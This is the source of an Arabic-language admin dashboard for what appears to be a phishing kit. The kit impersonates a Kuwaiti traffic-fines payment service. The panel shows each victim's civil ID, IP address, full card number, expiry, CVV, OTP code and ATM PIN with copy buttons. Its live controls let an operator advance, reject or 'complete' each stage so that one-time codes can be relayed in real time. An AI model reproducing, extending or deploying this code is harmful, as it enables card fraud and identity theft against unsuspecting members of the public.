import { useState, useEffect, useRef } from "react";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  civilId: string | null;
  enquiryType: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

// ======== الحالات ========
const stageConfig: Record<Stage, { label: string; color: string; bg: string }> = {
  card:         { label: "جديد",              color: "#2563eb", bg: "#dbeafe" },
  card_pending: { label: "انتظار دفع",        color: "#d97706", bg: "#fef3c7" },
  otp:          { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  otp_pending:  { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3" },
  atm:          { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  atm_pending:  { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe" },
  success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7" },
  failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2" },
};

function StageBadge({ stage }: { stage: Stage }) {
  const cfg = stageConfig[stage] || { label: stage, color: "#6b7280", bg: "#f3f4f6" };
  return (
    <span
      className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-semibold"
      style={{ color: cfg.color, backgroundColor: cfg.bg }}
    >
      {cfg.label}
    </span>
  );
}

// ======== Modal تفاصيل الحجز ========
function BookingDetailModal({
  session,
  token,
  onClose,
  onAction,
}: {
  session: PaymentSession;
  token: string;
  onClose: () => void;
  onAction: (action: "pass" | "denied" | "completed", errorMsg?: string) => void;
}) {
  const [customError, setCustomError] = useState("تم رفض العملية. يرجى المحاولة مرة أخرى.");
  const [copied, setCopied] = useState<string | null>(null);
  const isPending = session.stage.endsWith("_pending");

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(text);
      setTimeout(() => setCopied(null), 2000);
    });
  };

  const InfoRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <span className="text-gray-800 text-sm font-medium text-left">{value || "-"}</span>
    </div>
  );

  const CopyRow = ({ label, value }: { label: string; value?: string | null }) => (
    <div className="flex justify-between items-center py-2.5 border-b border-gray-100 last:border-0">
      <span className="text-gray-500 text-sm">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-gray-800 text-sm font-mono font-semibold">{value || "-"}</span>
        {value && (
          <button
            onClick={() => copyText(value)}
            className="text-gray-400 hover:text-blue-500 transition p-1 rounded"
            title="نسخ"
          >
            {copied === value ? (
              <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            )}
          </button>
        )}
      </div>
    </div>
  );

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div
        className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto shadow-2xl"
        onClick={e => e.stopPropagation()}
        dir="rtl"
      >
        <div className="flex items-center justify-between p-5 border-b border-gray-200">
          <h3 className="text-gray-800 font-bold text-base">
            تفاصيل الحجز - <span className="text-blue-600 font-mono text-sm">{session.sessionId.slice(0, 16)}</span>
          </h3>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition">
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="p-5 space-y-5">
          <div>
            <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
              <svg className="w-4 h-4 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              بيانات العميل
            </h4>
            <div className="bg-gray-50 rounded-xl px-4">
              <InfoRow label="الاسم" value={session.cardName || "غير محدد"} />
              <InfoRow label="الرقم المدني" value={session.civilId} />
              <InfoRow label="نوع الاستعلام" value={session.enquiryType === "2" ? "شركات" : "أفراد"} />
              <InfoRow label="المبلغ الإجمالي" value={session.totalAmount ? `${session.totalAmount} KWD` : null} />
              <InfoRow label="IP العميل" value={session.clientIp} />
              <InfoRow label="الحالة" value={stageConfig[session.stage]?.label} />
            </div>
          </div>

          {session.cardNumber && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                </svg>
                بيانات البطاقة
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="اسم الحامل" value={session.cardName} />
                <CopyRow label="رقم البطاقة" value={session.cardNumber} />
                <CopyRow label="تاريخ الانتهاء" value={session.cardExpiry} />
                <CopyRow label="CVV" value={session.cardCvv} />
              </div>
            </div>
          )}

          {session.otpCode && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                رمز OTP
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="رمز OTP" value={session.otpCode} />
              </div>
            </div>
          )}

          {session.atmPin && (
            <div>
              <h4 className="text-gray-700 font-bold text-sm mb-3 flex items-center gap-2">
                <svg className="w-4 h-4 text-amber-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
                الرقم السري (PIN)
              </h4>
              <div className="bg-gray-50 rounded-xl px-4">
                <CopyRow label="PIN" value={session.atmPin} />
              </div>
            </div>
          )}

          {isPending && (
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4">
              <h4 className="text-amber-700 font-bold text-sm mb-3">⚡ الإجراءات</h4>
              <div className="flex flex-wrap gap-2 mb-3">
                <button
                  onClick={() => onAction("pass")}
                  className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  قبول / التالي
                </button>
                <button
                  onClick={() => onAction("denied", customError)}
                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                  رفض
                </button>
                <button
                  onClick={() => onAction("completed")}
                  className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-1.5"
                >
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  إتمام الدفع
                </button>
              </div>
              <div>
                <label className="text-gray-600 text-xs mb-1 block">رسالة الرفض المخصصة:</label>
                <input
                  type="text"
                  value={customError}
                  onChange={e => setCustomError(e.target.value)}
                  className="w-full border border-gray-300 text-gray-800 text-sm rounded-lg px-3 py-2 focus:outline-none focus:border-blue-500 bg-white"
                />
              </div>
            </div>
          )}

          <div className="bg-gray-50 rounded-xl px-4">
            <InfoRow label="تاريخ الإنشاء" value={new Date(session.createdAt).toLocaleString("ar-AE")} />
            <InfoRow label="آخر تحديث" value={new Date(session.updatedAt).toLocaleString("ar-AE")} />
          </div>
        </div>
      </div>
    </div>
  );
}

// ======== الصفحة الرئيسية ========
export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [notification, setNotification] = useState<{ message: string; type: "success" | "error" | "info" } | null>(null);
  const notifTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [redirectSession, setRedirectSession] = useState<PaymentSession | null>(null);
  const [redirectUrl, setRedirectUrl] = useState("");
  const redirectMutation = trpc.admin.redirect.useMutation();
  const [activeVisitors, setActiveVisitors] = useState(0);
  const wsRef = useRef<WebSocket | null>(null);

  useEffect(() => {
    if (!token) return;
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/visitors?admin=true`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'visitor_count') {
          setActiveVisitors(data.count);
        }
      } catch {}
    };
    return () => ws.close();
  }, [token]);

  const showNotif = (message: string, type: "success" | "error" | "info") => {
    setNotification({ message, type });
    if (notifTimer.current) clearTimeout(notifTimer.current);
    notifTimer.current = setTimeout(() => setNotification(null), 4000);
  };

  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery({ token: token || "" }, { enabled: !!token, retry: false });
  const statsQuery = trpc.admin.getStats.useQuery({ token: token || "" }, { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 8000 });
  const sessionsQuery = trpc.admin.getSessions.useQuery({ token: token || "" }, { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 5000 });
  const sessionDetailQuery = trpc.admin.getSession.useQuery({ token: token || "", sessionId: selectedSession?.sessionId || "" }, { enabled: !!token && !!selectedSession, refetchInterval: 3000 });
  const actionMutation = trpc.admin.action.useMutation();

  useEffect(() => {
    if (verifyQuery.data && !verifyQuery.data.valid) {
      localStorage.removeItem("adminToken");
      setToken(null);
    }
  }, [verifyQuery.data]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLoginError("");
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError(err.message || "كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setToken(null);
  };

  const handleAction = async (action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!selectedSession || !token) return;
    try {
      const res = await actionMutation.mutateAsync({
        token,
        sessionId: selectedSession.sessionId,
        action,
        errorMessage: errorMsg,
      });
      showNotif(`تم تنفيذ الإجراء بنجاح`, "success");
      setSelectedSession(null);
      sessionsQuery.refetch();
      statsQuery.refetch();
    } catch (err: any) {
      showNotif(err.message || "حدث خطأ", "error");
    }
  };

  if (!token || verifyQuery.data?.valid === false) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-[#0f172a]" dir="rtl">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-sm">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <svg className="w-9 h-9 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h2 className="text-gray-800 text-xl font-bold">نظام مخالفات الكويت</h2>
            <p className="text-gray-500 text-sm mt-1">لوحة التحكم الإدارية</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="كلمة المرور"
                className="w-full border border-gray-300 text-gray-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500"
              />
            </div>
            <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl font-bold transition shadow-md">دخول</button>
          </form>
        </div>
      </div>
    );
  }

  const stats = statsQuery.data;
  const allSessions: PaymentSession[] = sessionsQuery.data || [];
  const filteredSessions = allSessions.filter(s => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (s.sessionId || "").toLowerCase().includes(q) || (s.civilId || "").toLowerCase().includes(q);
  });

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {notification && (
        <div className={`fixed top-4 right-4 z-50 rounded-xl px-4 py-3 shadow-lg flex items-center gap-3 text-white text-sm font-medium ${notification.type === "success" ? "bg-green-600" : "bg-red-600"}`}>
          <p>{notification.message}</p>
        </div>
      )}

      {selectedSession && token && (
        <BookingDetailModal
          session={sessionDetailQuery.data || selectedSession}
          token={token}
          onClose={() => setSelectedSession(null)}
          onAction={handleAction}
        />
      )}

      {/* ===== Header ===== */}
      <header className="bg-white border-b border-gray-200 px-6 py-2 flex items-center justify-between shadow-sm sticky top-0 z-40">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center shadow">
            <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10l2 2h10l2-2z" />
            </svg>
          </div>
          <div>
            <h1 className="text-gray-800 font-bold text-xs leading-tight">نظام مخالفات الكويت</h1>
            <p className="text-blue-600 text-[10px] font-semibold">لوحة التحكم</p>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="flex items-center gap-1.5 bg-green-50 px-3 py-1 rounded-full border border-green-100">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
            <span className="text-green-700 text-xs font-bold">متصل</span>
          </div>
          <button
            onClick={handleLogout}
            className="flex items-center gap-1.5 bg-red-50 hover:bg-red-100 text-red-600 px-3 py-1.5 rounded-lg text-xs font-bold transition border border-red-100"
          >
            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
            </svg>
            خروج
          </button>
        </div>
      </header>

      <div className="px-6 py-6">
        {/* ===== Stats Cards ===== */}
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8">
          {[
            { label: "إجمالي الحجوزات", value: stats?.total ?? 0, color: "blue", icon: "M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z" },
            { label: "حجوزات جديدة", value: stats?.new ?? 0, color: "orange", icon: "M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" },
            { label: "مكتملة", value: stats?.completed ?? 0, color: "green", icon: "M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" },
            { label: "قيد المعالجة", value: stats?.pending ?? 0, color: "amber", icon: "M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" },
            { label: "زيارات نشطة", value: activeVisitors, color: "purple", icon: "M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" },
          ].map((stat, i) => (
            <div key={i} className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 flex flex-col items-center text-center transition hover:shadow-md">
              <div className={`w-12 h-12 rounded-xl flex items-center justify-center mb-3 bg-${stat.color}-50 text-${stat.color}-600`}>
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={stat.icon} />
                </svg>
              </div>
              <div className="text-2xl font-black text-gray-900 mb-1">{stat.value}</div>
              <div className="text-gray-500 text-xs font-bold">{stat.label}</div>
            </div>
          ))}
        </div>

        {/* ===== Table ===== */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="flex items-center justify-between px-6 py-4 border-b border-gray-100 bg-gray-50/50">
            <h2 className="text-gray-800 font-bold text-sm">قائمة العمليات الأخيرة</h2>
            <div className="relative">
              <input
                type="text"
                placeholder="بحث بالرقم المدني..."
                value={searchQuery}
                onChange={e => setSearchQuery(e.target.value)}
                className="border border-gray-200 rounded-xl px-4 py-2 text-xs w-64 focus:outline-none focus:border-blue-500 bg-white"
              />
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="bg-gray-50 text-gray-500">
                  <th className="text-right px-6 py-4 font-bold text-xs uppercase tracking-wider">الرقم المدني</th>
                  <th className="text-right px-6 py-4 font-bold text-xs uppercase tracking-wider">المبلغ</th>
                  <th className="text-right px-6 py-4 font-bold text-xs uppercase tracking-wider">الحالة</th>
                  <th className="text-right px-6 py-4 font-bold text-xs uppercase tracking-wider">التاريخ</th>
                  <th className="text-center px-6 py-4 font-bold text-xs uppercase tracking-wider">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {filteredSessions.map((s) => (
                  <tr key={s.sessionId} className="hover:bg-blue-50/20 transition">
                    <td className="px-6 py-4 font-mono font-bold text-gray-700">{s.civilId || "-"}</td>
                    <td className="px-6 py-4 font-bold text-blue-600">{s.totalAmount ? `${s.totalAmount} دك` : "-"}</td>
                    <td className="px-6 py-4"><StageBadge stage={s.stage} /></td>
                    <td className="px-6 py-4 text-gray-500 text-xs">{new Date(s.createdAt).toLocaleString("ar-AE", { dateStyle: 'short', timeStyle: 'short' })}</td>
                    <td className="px-6 py-4 text-center">
                      <button
                        onClick={() => setSelectedSession(s)}
                        className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg text-xs font-bold transition shadow-sm"
                      >
                        فتح التفاصيل
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
